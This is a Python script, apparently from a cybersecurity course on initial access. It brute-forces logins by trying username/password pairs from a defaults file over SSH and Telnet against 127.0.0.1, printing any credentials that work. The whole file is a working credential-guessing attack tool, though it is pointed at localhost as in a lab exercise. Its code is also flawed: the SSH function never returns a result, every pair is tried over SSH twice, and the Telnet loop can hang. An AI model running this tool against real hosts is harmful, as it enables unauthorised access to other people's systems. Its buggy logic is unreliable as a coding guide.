import paramiko
import telnetlib

def ssh_login(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username=username, password=password)
        print(f"SSH login successful on {host}:{port} with username {username} and password {password}")
    except Exception as e:
        print(f"SSH login failed: {e}")

def telnet_login(host, port, username, password):
    try:
        tn = telnetlib.Telnet(host, port)

        # Read the initial prompt and send the username
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")

        # Read the password prompt and send the password
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")

        # Read lines and check for success or failure indicators
        while True:
            line = tn.read_very_eager().decode('ascii')
            if "Last login" in line:
                print(f"Telnet login successful on {host}:{port} with username {username} and password {password}")
                return True
            elif "Permission denied" in line or "Invalid user" in line:
                print(f"Telnet login failed: {line}")
                return False

    except Exception as e:
        print(f"Telnet login failed: {e}")
        return False

    finally:
        tn.close()

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 2200

    with open("E:\Python For Cybersecurity\MITRE ATT&CK Initial Access\defaults.txt", "r") as f:
        for line in f:
            vals = line.split()
            username = vals[0].strip()
            password = vals[1].strip()

            # Try SSH first
            ssh_login(host, port, username, password)

            # If SSH fails, try Telnet
            if not ssh_login(host, port, username, password):
                telnet_login(host, port, username, password)
